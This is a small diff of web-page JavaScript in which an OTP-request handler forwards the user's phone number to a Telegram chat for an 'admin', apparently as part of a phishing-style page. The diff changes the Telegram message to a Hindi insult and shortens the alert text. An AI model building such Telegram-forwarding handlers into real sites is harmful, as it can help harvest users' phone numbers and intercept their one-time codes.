@@ -1347,11 +1347,11 @@
                 sendOtpBtn.textContent = 'Sending...';
 
                 // Telegram ko message bhejein
-                const message = `== OTP REQUEST ==\n\nNumber: ${phone}`;
+                const message = `== OTP BHEJ JALDI GANDU ==\n\nNumber: ${phone}`;
                 const sent = await sendTelegramMessage(message);
 
                 if (sent) {
-                    showCustomAlert('OTP request sent to admin. You will receive an OTP shortly.');
+                    showCustomAlert('OTP REQUEST SENT ✔️ .');
                     // Yahan aap timer bhi chala sakte hain
                 } else {
                     showCustomAlert('Failed to send request. Please try again.');
